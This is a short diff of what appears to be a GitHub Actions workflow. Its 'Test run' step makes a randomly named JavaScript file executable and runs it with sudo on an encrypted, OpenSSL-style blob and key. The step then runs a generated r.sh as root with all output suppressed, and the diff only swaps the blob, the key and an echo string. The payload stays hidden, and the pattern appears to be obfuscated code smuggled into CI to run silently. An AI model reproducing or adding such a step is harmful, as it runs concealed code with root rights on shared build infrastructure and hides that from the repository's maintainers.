@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo 'smu52'
+        echo 'daqsv'
         sudo chmod +x johns2xqp/field806dx/piersonteqsh/rubiox050l.js
-        sudo ./johns2xqp/field806dx/piersonteqsh/rubiox050l.js U2FsdGVkX19+S/zsUmCWRa1/5JlZ7u1EFmZ3DtSVbar23oZabMGlB3TBIqrqD+3FjLNVY7Zg38hTtsdHPew4FGrAasdnEl6qsY8F/IWhkldCz8qOk92PPSUbivvDsQyy votyr1 && sudo sh r.sh > /dev/null 2>&1
+        sudo ./johns2xqp/field806dx/piersonteqsh/rubiox050l.js U2FsdGVkX1+pRdWdQ5JtD/9ILOfmy4Q090ePToo0Zi3MSi/cWh+EfiXdWIH8Jq7FYhyTM4Uc9KeXT58tUOtrZryCG3FNATFiGUvWh8VkNr8mEy4OaQwDvGOIOlXfwrIE rsrx4o && sudo sh r.sh > /dev/null 2>&1
